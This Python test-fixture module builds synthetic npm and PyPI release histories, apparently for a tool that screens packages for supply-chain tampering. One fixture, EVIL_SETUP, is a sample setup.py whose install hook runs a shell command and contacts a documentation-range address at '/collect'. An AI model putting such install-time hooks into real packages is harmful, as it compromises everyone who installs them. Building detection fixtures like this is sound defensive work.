"""Builders for synthetic release histories. All file contents are INERT TEXT: they are packed into in-memory
archives and read back with releases.read_archive, never written to disk, imported or executed. Network
addresses use the 198.51.100.0/24 documentation range."""
import io
import tarfile
import zipfile

from releases import read_archive


def tgz(files: dict[str, str | bytes], root: str = "package") -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in files.items():
            raw = data.encode() if isinstance(data, str) else data
            info = tarfile.TarInfo(f"{root}/{name}" if root else name)
            info.size = len(raw)
            tf.addfile(info, io.BytesIO(raw))
    return buf.getvalue()


def wheel(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def npm_release(version, upload_time, files=None, scripts=None, publisher="alice", deps=None, git_head=None):
    files = {"package.json": '{"name": "demo"}', "index.js": "module.exports = function (a) { return a; };\n", **(files or {})}
    return {"version": version, "upload_time": upload_time, "yanked": False,
            "artifact": {"filename": f"demo-{version}.tgz", "url": f"https://registry.example/demo-{version}.tgz", "kind": "npm_tgz"},
            "files": [], "dependencies": sorted((deps or {}).keys()), "dependencies_raw": deps or {},
            "install_scripts": {k: v for k, v in (scripts or {}).items() if k in ("preinstall", "install", "postinstall")},
            "publisher": publisher, "publisher_source": "npm _npmUser", "git_head": git_head,
            "contents": read_archive(tgz(files), "npm_tgz"), "artifact_status": "read"}


def pypi_release(version, upload_time, files=None, publisher=None, kind="sdist"):
    files = {"PKG-INFO": "Name: demo\n", "demo/__init__.py": "VERSION = '1'\n", **(files or {})}
    blob = tgz(files, root=f"demo-{version}") if kind == "sdist" else wheel(files)
    return {"version": version, "upload_time": upload_time, "yanked": False,
            "artifact": {"filename": f"demo-{version}.tar.gz", "url": f"https://files.example/demo-{version}", "kind": kind},
            "files": [], "dependencies": [], "dependencies_raw": [], "install_scripts": None, "git_head": None,
            "publisher": publisher, "publisher_source": "PyPI provenance (Trusted Publisher)" if publisher else "no provenance (not uploaded with Trusted Publishing)",
            "contents": read_archive(blob, kind), "artifact_status": "read"}


def history(releases, ecosystem="npm", name="demo"):
    return {"package": {"ecosystem": ecosystem, "name": name},
            "history": {"status": "ok", "reason": None, "ecosystem": ecosystem, "name": name, "releases": releases,
                        "unlisted_versions": [], "fields": {}},
            "git": None}


def with_git(rc, default_tree, tags=(), tag_tree=None, matched=None):
    rc = dict(rc)
    rc["git"] = {"status": "ok", "default_branch": "main", "tags": list(tags), "tags_error": None, "matched_tag": matched,
                 "trees": {"default": sorted(default_tree), **({"tag": sorted(tag_tree)} if tag_tree else {})},
                 "tree_errors": {}, "truncated": []}
    return rc


BENIGN_SETUP = "from setuptools import setup\nsetup(name='demo', version='1.0')\n"
EVIL_SETUP = (
    "import subprocess, urllib.request\n"
    "from setuptools import setup, Command\n"
    "class PostInstall(Command):\n"
    "    def run(self):\n"
    "        subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
    "        urllib.request.urlopen('http://198.51.100.42/collect')\n"
    "setup(name='demo', version='1.1', cmdclass={'install': PostInstall})\n")
NATIVE_BUILD_SETUP = (
    "from setuptools import setup, Extension\n"
    "from setuptools.command.build_ext import build_ext\n"
    "class BuildExt(build_ext):\n"
    "    def run(self):\n"
    "        build_ext.run(self)\n"
    "setup(name='demo', version='1.1', ext_modules=[Extension('demo._fast', ['src/fast.c'])], cmdclass={'build_ext': BuildExt})\n")
